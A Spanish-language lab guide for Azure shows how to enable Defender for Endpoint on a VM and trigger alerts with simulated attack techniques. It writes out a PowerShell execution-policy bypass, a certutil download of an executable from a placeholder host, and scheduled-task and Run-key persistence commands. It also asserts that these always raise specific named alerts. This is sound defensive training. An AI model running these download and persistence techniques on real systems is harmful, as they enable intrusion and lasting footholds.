# Laboratorio: Alertas Garantizadas en Microsoft Defender for Endpoint

## 1. Crear la VM en Azure

### 1.1. Ingresar al portal
- Ir a `https://portal.azure.com`
- Loguearte con tu cuenta habitual.

### 1.2. Crear la VM
- **Crear un recurso → Máquina virtual**
- Configuración:
  - **Nombre:** `vm-alertas-lab`
  - **Grupo de recursos:** `rg-alertas-lab`
  - **Imagen:** Windows Server 2019 o 2022
  - **Tamaño:** B2ms
  - **Usuario:** `labadmin`
  - **Contraseña:** segura
  - **Puertos:** RDP (3389)
- **Crear**

---

## 2. Habilitar Defender for Servers (necesario para MDE)

### 2.1. Entrar a Defender for Cloud
- Menú izquierdo → **Microsoft Defender for Cloud**

### 2.2. Activar Defender for Servers
- **Environment settings**
- Seleccionar tu suscripción
- **Microsoft Defender plans**
- Activar **Defender for Servers Plan 2**
- Guardar

> Esto instala automáticamente el sensor de Defender for Endpoint en la VM.

---

## 3. Conectarse a la VM

### 3.1. RDP
- Ir a la VM → **Conectar → RDP**
- Abrir el archivo `.rdp`
- Loguearte con `labadmin`

---

## 4. Generar actividad que produce alertas reales

> Estas acciones **SIEMPRE** generan alertas en Defender for Endpoint.  
> No usan malware. Son técnicas de simulación seguras.

---

## 4.1. Alerta garantizada: **Suspicious PowerShell command**

Ejecutar en PowerShell (Admin):

```powershell
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Expression('Write-Host test')"
```

**Alertas esperadas:**
- Suspicious PowerShell command
- Potentially obfuscated command

---

## 4.2. Alerta garantizada: **Uso sospechoso de certutil (LOLBIN)**

```powershell
certutil -urlcache -split -f https://example.com/test.exe C:\Temp\test.exe
```

**Alertas esperadas:**
- Suspicious use of certutil
- Potential malware download behavior

---

## 4.3. Alerta garantizada: **Persistencia vía Scheduled Task**

```powershell
schtasks /create /tn "LabTask" /tr "powershell.exe -c Write-Host test" /sc minute
```

**Alertas esperadas:**
- Suspicious scheduled task creation
- Persistence mechanism detected

---

## 4.4. Alerta garantizada: **Persistencia vía Run Key**

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "LabKey" -Value "powershell.exe"
```

**Alertas esperadas:**
- Registry-based persistence
- Suspicious autorun entry

---

## 5. Ver las alertas en Microsoft Defender for Endpoint

### 5.1. Ir al portal de seguridad
`https://security.microsoft.com/alerts`

### 5.2. Filtrar por dispositivo
- Buscar: `vm-alertas-lab`
- Ver incidentes y alertas generadas por:
  - PowerShell sospechoso  
  - Uso de certutil  
  - Persistencia  
  - Descarga de ejecutables  

---

## 6. Ver las alertas en Defender for Cloud

### 6.1. Azure Portal → Defender for Cloud
- **Security alerts**
- Filtrar por recurso: `vm-alertas-lab`

---

## 7. Resultado del laboratorio

- La VM quedó protegida por Defender for Endpoint.  
- Se generaron alertas reales sin usar malware.  
- Defender for Cloud correlacionó las señales.  
- El alumno ve claramente:
  - Telemetría  
  - Alertas  
  - Incidentes  
  - Persistencia  
  - Comportamiento sospechoso  
